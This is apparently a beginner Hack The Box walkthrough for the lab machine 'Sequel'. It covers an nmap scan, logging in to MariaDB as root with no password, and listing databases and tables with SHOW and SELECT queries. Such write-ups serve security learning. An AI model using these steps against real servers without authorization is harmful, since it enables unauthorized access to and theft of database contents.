---
layout: post
title: 00 - Sequel
date: 2022-08-20
categories: [Writeups,HTB,Very_Easy,Sequel]
tags: [SQL,MariaDB]
---

# Intro
| Dificulty | OS | Start Date | End Date |
|---|---|---|---|
| Very Easy | Linux | 17/05/2022 | 17/05/2022 |


# Thought process
1. View running services with `nmap`.
2. LogIn to MariaDB using root (Doesn't need password)
3. `Show databases` and `use` one.
4. `Select` content of the tables.


# Resolution
After seeing that the machine had a MariaDB server, I tried to login as root (by default it has no password).
> LogIn to MariaDB
```bash
$ mysql -h @IP -u root
```

I listed the Databases and Selected the one call it "htb"
> Show Databases and Use it
```sql
SHOW databases; /* */ USE dName;
```

Once inside a Database I listed the Tables and made a simple SELECT.
> Show Tables and Simple Select
```sql
SHOW tables; /**/ SELECT * FROM tNAME;
```